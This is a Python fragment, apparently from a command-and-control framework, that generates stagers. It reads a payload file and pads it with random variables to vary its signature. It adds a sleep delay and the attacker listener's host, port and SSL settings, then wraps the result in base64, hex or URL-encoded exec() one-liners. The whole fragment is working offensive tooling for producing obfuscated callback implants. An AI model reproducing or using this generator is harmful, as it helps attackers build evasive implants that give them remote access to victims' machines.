    if stager_db.listener.type not in AVAILABLE_PAYLOADS:  # also works as the stager type
        raise ValueError(f"Stager {stager_db.listener.type} is not available.")
    # Get the Payload from the File
    try:
        with open("Payloads/" + stager_db.listener.type + ".py", "r") as f:
            payload = f.read()
    except Exception as e:
        raise FileNotFoundError("Couldn't find the payload.") from e

    # Randomize the Payload
    if stager_db.random_size:
        start = "".join(random.choices(string.ascii_letters, k=random.randint(5, 10))) + " = " + \
            "'" + "".join(random.choices(string.ascii_letters +
                          string.digits, k=random.randint(100, 500))) + "'"
        end = "".join(random.choices(string.ascii_letters, k=random.randint(5, 10))) + " = " + \
            "'" + "".join(random.choices(string.ascii_letters +
                          string.digits, k=random.randint(100, 500))) + "'"
    else:
        start = ""
        end = ""

    # Replace the Payload
    finished_payload = start + "\n"
    finished_payload += f"import time\ntime.sleep({stager_db.delay})\n"
    finished_payload += f"HOST = '{stager_db.listener.address}'\n" \
        f"PORT = {stager_db.listener.port}\n" \
        f"TIMEOUT = {stager_db.timeout}\n" \
        f"SSL={stager_db.listener.ssl}\n"
    finished_payload += payload + "\n" + end

    # Encode the Payload
    if not one_liner and stager_db.format != "exe":
        if stager_db.encoding == "base64":
            finished_payload = base64.b64encode(
                finished_payload.encode()).decode()
        elif stager_db.encoding == "hex":
            finished_payload = hexlify(finished_payload.encode()).decode()
        elif stager_db.encoding == "url":
            finished_payload = urllib.parse.quote(finished_payload)
        elif stager_db.encoding == "raw":
            ...
        else:
            raise ValueError("Encoding not supported")
    else:
        if stager_db.encoding == "base64":
            finished_payload = "import base64;" \
                "exec(base64.b64decode(b'%s'))" % base64.b64encode(
                    finished_payload.encode()).decode()
        elif stager_db.encoding == "hex":
            finished_payload = "from binascii import unhexlify;exec(unhexlify('%s'))" % hexlify(
                finished_payload.encode()).decode()
        elif stager_db.encoding == "url":
            finished_payload = "import urllib.parse;" \
                "exec(urllib.parse.unquote('%s'))""" % urllib.parse.quote(
                    finished_payload)
        elif stager_db.encoding == "raw":
            ...
        else:
            raise ValueError("encoding not supported")

    if stager_db.format == "py":
        return finished_payload
    elif stager_db.format == "exe":
        # Create the EXE
        pass
    else:
        raise ValueError("Unknown Format")
